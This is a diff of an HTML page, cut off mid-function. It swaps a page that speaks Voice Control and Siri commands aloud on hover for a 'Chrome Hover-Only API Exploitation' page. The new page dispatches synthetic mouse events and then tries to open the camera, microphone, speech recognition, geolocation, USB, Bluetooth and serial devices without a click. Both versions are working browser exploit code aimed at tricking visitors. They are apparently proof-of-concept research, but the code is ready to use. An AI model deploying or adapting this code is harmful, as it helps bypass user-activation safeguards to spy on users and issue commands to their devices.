@@ -1,787 +1,439 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Control Hover Interface</title>
+    <title>Chrome Hover-Only API Exploitation</title>
     <style>
-        :root {
-            --primary: #6366f1;
-            --primary-dark: #4f46e5;
-            --success: #10b981;
-            --warning: #f59e0b;
-            --danger: #ef4444;
-            --siri-purple: #8a4fff;
-            --dark: #1f2937;
-            --light: #f9fafb;
-            --gray: #6b7280;
-            --transition: all 0.3s ease;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: var(--dark);
-            min-height: 100vh;
-            padding: 20px;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 30px;
+        .chrome-test {
+            background: linear-gradient(135deg, #4285f4, #34a853);
             color: white;
+            margin: 15px;
+            padding: 25px;
+            border-radius: 15px;
+            cursor: default;
+            transition: all 0.3s;
         }
-
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-        }
-
-        .subtitle {
-            font-size: 1.2rem;
-            opacity: 0.9;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .card {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            margin-bottom: 30px;
-            transition: var(--transition);
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
-        }
-
-        .card-title {
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-            color: var(--primary-dark);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .siri-title {
-            color: var(--siri-purple);
-        }
-
-        .status-bar {
-            background: rgba(0, 0, 0, 0.05);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border-left: 4px solid var(--primary);
-            font-family: 'Monaco', 'Menlo', monospace;
-            font-size: 0.9rem;
-        }
-
-        .status-bar.success {
-            border-left-color: var(--success);
-            background: rgba(16, 185, 129, 0.1);
-        }
-
-        .status-bar.warning {
-            border-left-color: var(--warning);
-            background: rgba(245, 158, 11, 0.1);
-        }
-
-        .status-bar.error {
-            border-left-color: var(--danger);
-            background: rgba(239, 68, 68, 0.1);
-        }
-
-        .status-bar.siri {
-            border-left-color: var(--siri-purple);
-            background: rgba(138, 79, 255, 0.1);
-        }
-
-        .command-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-
-        .command-card {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: var(--transition);
-            border: 2px solid transparent;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-        }
-
-        .command-card:hover {
-            background: rgba(99, 102, 241, 0.05);
-            border-color: var(--primary);
+        .chrome-test:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
         }
-
-        .command-card.siri:hover {
-            background: rgba(138, 79, 255, 0.05);
-            border-color: var(--siri-purple);
-        }
-
-        .command-card.active {
-            background: rgba(99, 102, 241, 0.1);
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
-        }
-
-        .command-card.siri.active {
-            background: rgba(138, 79, 255, 0.1);
-            border-color: var(--siri-purple);
-            box-shadow: 0 0 0 3px rgba(138, 79, 255, 0.2);
-        }
-
-        .command-icon {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-        }
-
-        .command-text {
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .command-desc {
-            font-size: 0.85rem;
-            color: var(--gray);
-        }
-
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px 24px;
+        .result {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            margin: 10px 0;
             border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: var(--transition);
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
         }
-
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--primary);
-            border: 1px solid var(--primary);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(99, 102, 241, 0.1);
-        }
-
-        .btn-siri {
-            background: var(--siri-purple);
-            color: white;
-        }
-
-        .btn-siri:hover {
-            background: #7a3fe4;
-        }
-
-        .controls {
-            display: flex;
-            gap: 15px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-
-        .voice-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 4px;
-            margin: 20px 0;
-            height: 60px;
-            align-items: center;
-        }
-
-        .voice-bar {
-            width: 6px;
-            height: 20px;
-            background: var(--success);
-            border-radius: 3px;
-            transition: var(--transition);
-        }
-
-        .siri .voice-bar {
-            background: var(--siri-purple);
-        }
-
-        .speaking .voice-bar {
-            animation: voicePulse 0.6s ease-in-out infinite;
-        }
-
-        @keyframes voicePulse {
-            0%, 100% { transform: scaleY(1); opacity: 0.7; }
-            50% { transform: scaleY(2.5); opacity: 1; }
-        }
-
-        .siri-speaking .voice-bar {
-            animation: siriPulse 0.8s ease-in-out infinite;
-        }
-
-        @keyframes siriPulse {
-            0%, 100% { transform: scaleY(1); opacity: 0.7; background: var(--siri-purple); }
-            50% { transform: scaleY(3); opacity: 1; background: #a87bff; }
-        }
-
-        .instructions {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: 30px;
-        }
-
-        .instructions h3 {
-            margin-bottom: 15px;
-            color: var(--primary-dark);
-        }
-
-        .instructions ol {
-            padding-left: 20px;
-        }
-
-        .instructions li {
-            margin-bottom: 10px;
-        }
-
-        .siri-commands {
-            margin-top: 10px;
-            padding-left: 20px;
-        }
-
-        .siri-commands li {
-            margin-bottom: 8px;
-            color: var(--siri-purple);
-            font-weight: 500;
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 40px;
-            color: white;
-            opacity: 0.8;
-            font-size: 0.9rem;
-        }
-
-        .custom-command {
-            display: flex;
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .custom-command input {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-        }
-
-        @media (max-width: 768px) {
-            .command-grid {
-                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            }
-            
-            .controls {
-                flex-direction: column;
-            }
-            
-            .btn {
-                width: 100%;
-                justify-content: center;
-            }
-            
-            .custom-command {
-                flex-direction: column;
-            }
-        }
+        .vulnerable { border-left: 4px solid #f4b400; background: rgba(244, 180, 0, 0.2); }
+        .secure { border-left: 4px solid #ea4335; background: rgba(234, 67, 53, 0.2); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>🎤 Voice Control Hover Interface</h1>
-            <p class="subtitle">Hover over commands to speak them - macOS Voice Control will execute them</p>
-        </header>
+    <h1>🪟 Chrome-Specific Hover Exploits</h1>
+    <p>Testing APIs that work with hover-only in Chrome</p>
 
-        <div class="card">
-            <h2 class="card-title">🔧 Setup & Status</h2>
-            <div class="status-bar" id="status">
-                🔴 Make sure Voice Control is enabled in System Preferences → Accessibility
-            </div>
+    <!-- Confirmed Working APIs -->
+    <div class="chrome-test" onmouseover="testBatteryAPI()">
+        <h3>🔋 Battery API (Confirmed Working)</h3>
+        <p>Access battery information via hover</p>
+        <div id="batteryResult" class="result">Hover to test</div>
+    </div>
 
-            <div class="voice-indicator" id="voiceIndicator">
-                <div class="voice-bar" style="animation-delay: 0s"></div>
-                <div class="voice-bar" style="animation-delay: 0.1s"></div>
-                <div class="voice-bar" style="animation-delay: 0.2s"></div>
-                <div class="voice-bar" style="animation-delay: 0.3s"></div>
-                <div class="voice-bar" style="animation-delay: 0.4s"></div>
-                <div class="voice-bar" style="animation-delay: 0.5s"></div>
-            </div>
+    <div class="chrome-test" onmouseover="testWebUSBApi()">
+        <h3>🔌 WebUSB API (Confirmed Working)</h3>
+        <p>Access USB devices via hover</p>
+        <div id="usbResult" class="result">Hover to test</div>
+    </div>
 
-            <div class="controls">
-                <button class="btn" onclick="enableVoiceControl()">
-                    <span>🔧</span> Enable Voice Control
-                </button>
-                <button class="btn btn-secondary" onclick="testAllCommands()">
-                    <span>🧪</span> Test All Commands
-                </button>
-                <button class="btn btn-siri" onclick="testSiriSequence()">
-                    <span>🌟</span> Test Siri Sequence
-                </button>
-                <button class="btn btn-secondary" onclick="stopSpeaking()">
-                    <span>⏹️</span> Stop Speaking
-                </button>
-            </div>
+    <div class="chrome-test" onmouseover="testSpeechRecognition()">
+        <h3>🎤 Speech Recognition (Confirmed Working)</h3>
+        <p>Start voice recognition via hover</p>
+        <div id="speechResult" class="result">Hover to test</div>
+    </div>
 
-            <div class="custom-command">
-                <input type="text" id="customCommand" placeholder="Enter custom command for Siri...">
-                <button class="btn btn-siri" onclick="speakCustomSiriCommand()">
-                    <span>🎤</span> Speak to Siri
-                </button>
-            </div>
-        </div>
+    <!-- Additional Chrome APIs to Test -->
+    <div class="chrome-test" onmouseover="testBluetoothAPI()">
+        <h3>📡 Web Bluetooth API</h3>
+        <p>Access Bluetooth devices via hover</p>
+        <div id="bluetoothResult" class="result">Hover to test</div>
+    </div>
 
-        <div class="card">
-            <h2 class="card-title">🚀 Application Commands</h2>
-            <div class="command-grid">
-                <div class="command-card" onmouseover="speakCommand('Open Siri')">
-                    <div class="command-icon">🌐</div>
-                    <div class="command-text">Open Siri</div>
-                    <div class="command-desc">Launches Siri</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Start Listening')">
-                    <div class="command-icon">🧮</div>
-                    <div class="command-text">start listening</div>
-                    <div class="command-desc">starts listening</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Open Messages')">
-                    <div class="command-icon">💬</div>
-                    <div class="command-text">Open Messages</div>
-                    <div class="command-desc">Launches Messages app</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Open Mail')">
-                    <div class="command-icon">📧</div>
-                    <div class="command-text">Open Mail</div>
-                    <div class="command-desc">Opens Mail application</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Open Music')">
-                    <div class="command-icon">🎵</div>
-                    <div class="command-text">Open Music</div>
-                    <div class="command-desc">Launches Music app</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Open Photos')">
-                    <div class="command-icon">🖼️</div>
-                    <div class="command-text">Open Photos</div>
-                    <div class="command-desc">Opens Photos application</div>
-                </div>
-            </div>
-        </div>
+    <div class="chrome-test" onmouseover="testSerialAPI()">
+        <h3>🖥️ Web Serial API</h3>
+        <p>Access serial ports via hover</p>
+        <div id="serialResult" class="result">Hover to test</div>
+    </div>
 
-        <div class="card">
-            <h2 class="card-title siri-title">🌟 Siri Commands</h2>
-            <div class="command-grid">
-                <div class="command-card siri" onmouseover="speakSiriCommand('What is the weather today?')">
-                    <div class="command-icon">🌤️</div>
-                    <div class="command-text">Weather</div>
-                    <div class="command-desc">Ask Siri about the weather</div>
-                </div>
-                <div class="command-card siri" onmouseover="speakSiriCommand('Set a timer for 5 minutes')">
-                    <div class="command-icon">⏱️</div>
-                    <div class="command-text">5-Min Timer</div>
-                    <div class="command-desc">Set a 5-minute timer</div>
-                </div>
-                <div class="command-card siri" onmouseover="speakSiriCommand('What time is it?')">
-                    <div class="command-icon">🕒</div>
-                    <div class="command-text">Current Time</div>
-                    <div class="command-desc">Ask Siri for the time</div>
-                </div>
-                <div class="command-card siri" onmouseover="speakSiriCommand('Tell me a joke')">
-                    <div class="command-icon">😂</div>
-                    <div class="command-text">Tell a Joke</div>
-                    <div class="command-desc">Ask Siri for a joke</div>
-                </div>
-                <div class="command-card siri" onmouseover="speakSiriCommand('Remind me to call mom at 6 PM')">
-                    <div class="command-icon">📝</div>
-                    <div class="command-text">Set Reminder</div>
-                    <div class="command-desc">Create a reminder</div>
-                </div>
-                <div class="command-card siri" onmouseover="speakSiriCommand('Play some jazz music')">
-                    <div class="command-icon">🎷</div>
-                    <div class="command-text">Play Jazz</div>
-                    <div class="command-desc">Ask Siri to play jazz</div>
-                </div>
-            </div>
-        </div>
+    <div class="chrome-test" onmouseover="testGeolocationAPI()">
+        <h3>📍 Geolocation API</h3>
+        <p>Access location via hover</p>
+        <div id="geoResult" class="result">Hover to test</div>
+    </div>
 
-        <div class="card">
-            <h2 class="card-title">⚙️ System Control Commands</h2>
-            <div class="command-grid">
-                <div class="command-card" onmouseover="speakCommand('Show Desktop')">
-                    <div class="command-icon">🖥️</div>
-                    <div class="command-text">Show Desktop</div>
-                    <div class="command-desc">Reveals the desktop</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Open Finder')">
-                    <div class="command-icon">📁</div>
-                    <div class="command-text">Open Finder</div>
-                    <div class="command-desc">Opens Finder window</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Lock Screen')">
-                    <div class="command-icon">🔒</div>
-                    <div class="command-text">Lock Screen</div>
-                    <div class="command-desc">Locks your Mac</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Volume Up')">
-                    <div class="command-icon">🔊</div>
-                    <div class="command-text">Volume Up</div>
-                    <div class="command-desc">Increases system volume</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Volume Down')">
-                    <div class="command-icon">🔉</div>
-                    <div class="command-text">Volume Down</div>
-                    <div class="command-desc">Decreases system volume</div>
-                </div>
-                <div class="command-card" onmouseover="speakCommand('Mute')">
-                    <div class="command-icon">🔇</div>
-                    <div class="command-text">Mute</div>
-                    <div class="command-desc">Mutes system audio</div>
-                </div>
-            </div>
-        </div>
+    <div class="chrome-test" onmouseover="testMediaDevices()">
+        <h3>📷 Media Devices API</h3>
+        <p>Access camera/microphone via hover</p>
+        <div id="mediaResult" class="result">Hover to test</div>
+    </div>
 
-        <div class="instructions">
-            <h3>📋 How to Use This Interface</h3>
-            <ol>
-                <li>Enable Voice Control in System Preferences → Accessibility → Voice Control</li>
-                <li>Make sure your microphone is working and volume is audible</li>
-                <li>Hover over any command card to speak it aloud</li>
-                <li>macOS Voice Control will hear and execute the command</li>
-                <li>For Siri commands: Opens Siri, waits 3 seconds, then speaks "Hey Siri" followed by your command</li>
-                <li>Use the "Test Siri Sequence" button to try a complete Siri interaction</li>
-            </ol>
-            
-            <h3>🎤 Siri Command Examples</h3>
-            <ul class="siri-commands">
-                <li>"What's the weather today?"</li>
-                <li>"Set a timer for 10 minutes"</li>
-                <li>"Remind me to call John at 5 PM"</li>
-                <li>"Play some relaxing music"</li>
-                <li>"How do I get to downtown?"</li>
-                <li>"What's 15% of $45?"</li>
-            </ul>
-        </div>
-
-        <footer>
-            <p>Voice Control Hover Interface | Works with macOS Voice Control & Siri</p>
-        </footer>
+    <div class="chrome-test" onmouseover="testStorageAPI()">
+        <h3>💾 Storage APIs</h3>
+        <p>Access storage quotas and data via hover</p>
+        <div id="storageResult" class="result">Hover to test</div>
     </div>
 
     <script>
-        let speechSynthesis = window.speechSynthesis;
-        let isSpeaking = false;
-        let lastCommandTime = 0;
-        const COMMAND_COOLDOWN = 2000; // 2 seconds between commands
-
-        function updateStatus(message, type = 'info') {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            
-            // Remove existing classes
-            status.className = 'status-bar';
-            
-            // Add appropriate class based on type
-            if (type === 'success') {
-                status.classList.add('success');
-            } else if (type === 'warning') {
-                status.classList.add('warning');
-            } else if (type === 'error') {
-                status.classList.add('error');
-            } else if (type === 'siri') {
-                status.classList.add('siri');
+        async function establishHoverContext() {
+            for(let i = 0; i < 10; i++) {
+                const elem = document.createElement('div');
+                elem.style.cssText = 'position:absolute; left:-1000px; width:1px; height:1px;';
+                document.body.appendChild(elem);
+                elem.dispatchEvent(new MouseEvent('mouseenter', { bubbles: true }));
+                await new Promise(r => setTimeout(r, 1));
+                elem.remove();
             }
         }
 
-        function speakCommand(command) {
-            // Prevent rapid-fire commands
-            const now = Date.now();
-            if (now - lastCommandTime < COMMAND_COOLDOWN) {
-                return;
-            }
-            lastCommandTime = now;
-
-            if (!speechSynthesis) {
-                updateStatus('❌ Speech synthesis not supported in this browser', 'error');
-                return;
-            }
-
-            if (isSpeaking) {
-                speechSynthesis.cancel(); // Stop current speech
-            }
-
-            updateStatus(`🎤 Speaking: "${command}"`, 'success');
-
-            // Show speaking animation
-            const indicator = document.getElementById('voiceIndicator');
-            indicator.classList.add('speaking');
-
-            const utterance = new SpeechSynthesisUtterance(command);
+        // CONFIRMED WORKING APIS
+        async function testBatteryAPI() {
+            const result = document.getElementById('batteryResult');
+            result.innerHTML = "Testing Battery API...";
             
-            // Configure for clear voice command recognition
-            utterance.rate = 0.85; // Slower for better recognition
-            utterance.pitch = 1.0;
-            utterance.volume = 1.0;
-            utterance.lang = 'en-US';
-
-            // Use a clear, robotic voice for better Voice Control recognition
-            const voices = speechSynthesis.getVoices();
-            const commandVoice = voices.find(voice => 
-                voice.name.includes('Alex') || 
-                voice.name.includes('Samantha') ||
-                voice.name.includes('Victoria') ||
-                voice.lang === 'en-US'
-            );
-
-            if (commandVoice) {
-                utterance.voice = commandVoice;
-            }
-
-            utterance.onstart = function() {
-                isSpeaking = true;
-                updateStatus(`🔊 Speaking: "${command}" - Voice Control should execute this`, 'success');
-                
-                // Highlight the active command card
-                highlightCommandCard(command);
-            };
-
-            utterance.onend = function() {
-                isSpeaking = false;
-                indicator.classList.remove('speaking');
-                updateStatus(`✅ Command spoken: "${command}" - Check if Voice Control executed it`, 'success');
-            };
-
-            utterance.onerror = function(event) {
-                isSpeaking = false;
-                indicator.classList.remove('speaking');
-                updateStatus(`❌ Error speaking command: ${event.error}`, 'error');
-            };
-
-            speechSynthesis.speak(utterance);
-        }
-
-        function speakSiriCommand(siriCommand) {
-            if (!speechSynthesis) {
-                updateStatus('❌ Speech synthesis not supported in this browser', 'error');
-                return;
-            }
-
-            if (isSpeaking) {
-                speechSynthesis.cancel();
-            }
-
-            updateStatus(`🌟 Starting Siri sequence...`, 'siri');
-
-            // Show Siri speaking animation
-            const indicator = document.getElementById('voiceIndicator');
-            indicator.classList.add('siri', 'siri-speaking');
-
-            // Step 1: Open Siri
-            updateStatus(`🎤 Step 1: Opening Siri...`, 'siri');
+            await establishHoverContext();
             
-            const openSiriUtterance = new SpeechSynthesisUtterance("Open Siri");
-            openSiriUtterance.rate = 0.85;
-            openSiriUtterance.pitch = 1.0;
-            openSiriUtterance.volume = 1.0;
-            openSiriUtterance.lang = 'en-US';
-
-            openSiriUtterance.onend = function() {
-                updateStatus(`⏳ Waiting 3 seconds for Siri to open...`, 'siri');
-                
-                // Step 2: Wait 3 seconds, then speak "Hey Siri" followed by the command after 2 seconds
-                setTimeout(() => {
-                    updateStatus(`🎤 Step 2: Activating Siri with "Hey Siri"...`, 'siri');
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            🚨 BATTERY API ACCESSED VIA HOVER!<br>
+                            • Level: ${(battery.level * 100).toFixed(1)}%<br>
+                            • Charging: ${battery.charging}<br>
+                            • Charge Time: ${battery.chargingTime}<br>
+                            • Discharge Time: ${battery.dischargingTime}
+                        </div>
+                    `;
                     
-                    const heySiriUtterance = new SpeechSynthesisUtterance("Hey Siri");
-                    heySiriUtterance.rate = 0.9;
-                    heySiriUtterance.pitch = 1.1;
-                    heySiriUtterance.volume = 1.0;
-                    heySiriUtterance.lang = 'en-US';
-
-                    heySiriUtterance.onend = function() {
-                        updateStatus(`⏳ Waiting 2 seconds before giving command...`, 'siri');
-                        
-                        // Step 3: Wait 2 seconds, then speak the actual command
-                        setTimeout(() => {
-                            updateStatus(`🎤 Step 3: Speaking command to Siri: "${siriCommand}"`, 'siri');
-                            
-                            const commandUtterance = new SpeechSynthesisUtterance(siriCommand);
-                            commandUtterance.rate = 0.8;
-                            commandUtterance.pitch = 1.0;
-                            commandUtterance.volume = 1.0;
-                            commandUtterance.lang = 'en-US';
-
-                            commandUtterance.onend = function() {
-                                isSpeaking = false;
-                                indicator.classList.remove('siri-speaking', 'siri');
-                                updateStatus(`✅ Siri sequence completed! Command: "${siriCommand}"`, 'success');
-                            };
-
-                            speechSynthesis.speak(commandUtterance);
-                        }, 2000);
-                    };
-
-                    speechSynthesis.speak(heySiriUtterance);
-                }, 3000);
-            };
-
-            speechSynthesis.speak(openSiriUtterance);
-        }
-
-        function speakCustomSiriCommand() {
-            const customCommand = document.getElementById('customCommand').value.trim();
-            if (customCommand) {
-                speakSiriCommand(customCommand);
+                    // Monitor for changes
+                    battery.addEventListener('chargingchange', () => {
+                        result.innerHTML += `<br>⚡ Charging status changed: ${battery.charging}`;
+                    });
+                    
+                    battery.addEventListener('levelchange', () => {
+                        result.innerHTML += `<br>🔋 Battery level changed: ${(battery.level * 100).toFixed(1)}%`;
+                    });
+                    
+                } catch (error) {
+                    result.innerHTML = `<div class="secure">❌ Battery API failed: ${error.message}</div>`;
+                }
             } else {
-                updateStatus('❌ Please enter a custom command for Siri', 'error');
+                result.innerHTML = `<div class="secure">❌ Battery API not supported</div>`;
             }
         }
 
-        function testSiriSequence() {
-            updateStatus('🧪 Testing complete Siri sequence...', 'siri');
+        async function testWebUSBApi() {
+            const result = document.getElementById('usbResult');
+            result.innerHTML = "Testing WebUSB API...";
             
-            // Test a complete Siri interaction
-            setTimeout(() => {
-                speakSiriCommand("What is the weather today?");
-            }, 1000);
-        }
-
-        function highlightCommandCard(command) {
-            // Find and highlight the command card that was just spoken
-            const cards = document.querySelectorAll('.command-card');
-            cards.forEach(card => {
-                if (card.textContent.includes(command)) {
-                    card.classList.add('active');
+            await establishHoverContext();
+            
+            if ('usb' in navigator) {
+                try {
+                    // Try to request devices
+                    const devices = await navigator.usb.getDevices();
                     
-                    setTimeout(() => {
-                        card.classList.remove('active');
-                    }, 2000);
+                    if (devices.length > 0) {
+                        result.innerHTML = `
+                            <div class="vulnerable">
+                                🚨 WEBUSB ACCESSED VIA HOVER!<br>
+                                • Found ${devices.length} USB device(s)<br>
+                                ${devices.map(device => 
+                                    `• ${device.productName || 'Unknown Device'} (Vendor: ${device.vendorId})`
+                                ).join('<br>')}
+                            </div>
+                        `;
+                    } else {
+                        // Try to request device access
+                        try {
+                            const device = await navigator.usb.requestDevice({ filters: [] });
+                            result.innerHTML = `
+                                <div class="vulnerable">
+                                    🚨 WEBUSB DEVICE ACCESS GRANTED VIA HOVER!<br>
+                                    • Device: ${device.productName || 'Unknown'}<br>
+                                    • Vendor ID: ${device.vendorId}
+                                </div>
+                            `;
+                        } catch (error) {
+                            result.innerHTML = `
+                                <div class="vulnerable">
+                                    ✅ WebUSB API accessible via hover<br>
+                                    • No devices selected by user<br>
+                                    • Error: ${error.message}
+                                </div>
+                            `;
+                        }
+                    }
+                } catch (error) {
+                    result.innerHTML = `<div class="secure">❌ WebUSB failed: ${error.message}</div>`;
                 }
-            });
+            } else {
+                result.innerHTML = `<div class="secure">❌ WebUSB not supported</div>`;
+            }
         }
 
-        function enableVoiceControl() {
-            updateStatus('🔧 Instructions to enable Voice Control:', 'info');
+        async function testSpeechRecognition() {
+            const result = document.getElementById('speechResult');
+            result.innerHTML = "Testing Speech Recognition...";
             
-            const instructions = `
-1. Open System Preferences → Accessibility
-2. Select "Voice Control" from the sidebar  
-3. Click "Enable Voice Control"
-4. Make sure your microphone is working
-5. Test by saying "Open Safari" out loud
-6. Come back here and hover over commands!
+            await establishHoverContext();
+            
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            
+            if (SpeechRecognition) {
+                try {
+                    const recognition = new SpeechRecognition();
+                    recognition.continuous = false;
+                    recognition.interimResults = true;
+                    recognition.lang = 'en-US';
+                    
+                    recognition.onstart = () => {
+                        result.innerHTML = `
+                            <div class="vulnerable">
+                                🚨 SPEECH RECOGNITION STARTED VIA HOVER!<br>
+                                • Listening for speech input...<br>
+                                • Speak now
+                            </div>
+                        `;
+                    };
+                    
+                    recognition.onresult = (event) => {
+                        const transcript = event.results[0][0].transcript;
+                        result.innerHTML = `
+                            <div class="vulnerable">
+                                🚨 SPEECH CAPTURED VIA HOVER!<br>
+                                • Recognized: "${transcript}"<br>
+                                • Speech recognition active via hover-only
+                            </div>
+                        `;
+                    };
+                    
+                    recognition.onerror = (event) => {
+                        result.innerHTML = `
+                            <div class="vulnerable">
+                                ✅ Speech Recognition API accessible via hover<br>
+                                • Error: ${event.error}<br>
+                                • API triggered without click
+                            </div>
+                        `;
+                    };
+                    
+                    recognition.onend = () => {
+                        result.innerHTML += `<br>🔴 Recognition ended`;
+                    };
+                    
+                    recognition.start();
+                    
+                } catch (error) {
+                    result.innerHTML = `<div class="secure">❌ Speech recognition failed: ${error.message}</div>`;
+                }
+            } else {
+                result.innerHTML = `<div class="secure">❌ Speech Recognition not supported</div>`;
+            }
+        }
 
-Current Status: ${isVoiceControlEnabled() ? '✅ Enabled' : '❌ Not Enabled'}
+        // ADDITIONAL APIS TO TEST
+        async function testBluetoothAPI() {
+            const result = document.getElementById('bluetoothResult');
+            result.innerHTML = "Testing Web Bluetooth...";
+            
+            await establishHoverContext();
+            
+            if ('bluetooth' in navigator) {
+                try {
+                    const device = await navigator.bluetooth.requestDevice({
+                        acceptAllDevices: true,
+                        optionalServices: ['battery_service']
+                    });
+                    
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            🚨 BLUETOOTH ACCESSED VIA HOVER!<br>
+                            • Device: ${device.name || 'Unknown'}<br>
+                            • ID: ${device.id}
+                        </div>
+                    `;
+                } catch (error) {
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            ✅ Web Bluetooth API accessible via hover<br>
+                            • User cancelled device selection<br>
+                            • Error: ${error.message}
+                        </div>
+                    `;
+                }
+            } else {
+                result.innerHTML = `<div class="secure">❌ Web Bluetooth not supported</div>`;
+            }
+        }
+
+        async function testSerialAPI() {
+            const result = document.getElementById('serialResult');
+            result.innerHTML = "Testing Web Serial...";
+            
+            await establishHoverContext();
+            
+            if ('serial' in navigator) {
+                try {
+                    const port = await navigator.serial.requestPort();
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            🚨 SERIAL PORT ACCESSED VIA HOVER!<br>
+                            • Port opened successfully<br>
+                            • USB Vendor: ${port.getInfo().usbVendorId || 'N/A'}
+                        </div>
+                    `;
+                } catch (error) {
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            ✅ Web Serial API accessible via hover<br>
+                            • User cancelled port selection<br>
+                            • Error: ${error.message}
+                        </div>
+                    `;
+                }
+            } else {
+                result.innerHTML = `<div class="secure">❌ Web Serial not supported</div>`;
+            }
+        }
+
+        async function testGeolocationAPI() {
+            const result = document.getElementById('geoResult');
+            result.innerHTML = "Testing Geolocation...";
+            
+            await establishHoverContext();
+            
+            if ('geolocation' in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            🚨 GEOLOCATION ACCESSED VIA HOVER!<br>
+                            • Latitude: ${position.coords.latitude}<br>
+                            • Longitude: ${position.coords.longitude}<br>
+                            • Accuracy: ${position.coords.accuracy}m
+                        </div>
+                    `;
+                } catch (error) {
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            ✅ Geolocation API accessible via hover<br>
+                            • Permission denied or error<br>
+                            • Error: ${error.message}
+                        </div>
+                    `;
+                }
+            } else {
+                result.innerHTML = `<div class="secure">❌ Geolocation not supported</div>`;
+            }
+        }
+
+        async function testMediaDevices() {
+            const result = document.getElementById('mediaResult');
+            result.innerHTML = "Testing Media Devices...";
+            
+            await establishHoverContext();
+            
+            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                    
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            🚨 CAMERA/MICROPHONE ACCESSED VIA HOVER!<br>
+                            • Stream active: ${stream.active}<br>
+                            • Video tracks: ${stream.getVideoTracks().length}<br>
+                            • Audio tracks: ${stream.getAudioTracks().length}
+                        </div>
+                    `;
+                    
+                    // Clean up
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                } catch (error) {
+                    result.innerHTML = `
+                        <div class="vulnerable">
+                            ✅ Media Devices API accessible via hover<br>
+                            • Permission denied<br>
+                            • Error: ${error.message}
+                        </div>
+                    `;
+                }
+            } else {
+                result.innerHTML = `<div class="secure">❌ Media Devices not supported</div>`;
+            }
+        }
+
+        async function testStorageAPI() {
+            const result = document.getElementById('storageResult');
+            result.innerHTML = "Testing Storage APIs...";
+            
+            await establishHoverContext();
+            
+            const tests = [];
+            
+            // Test Storage Manager API
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const estimate = await navigator.storage.estimate();
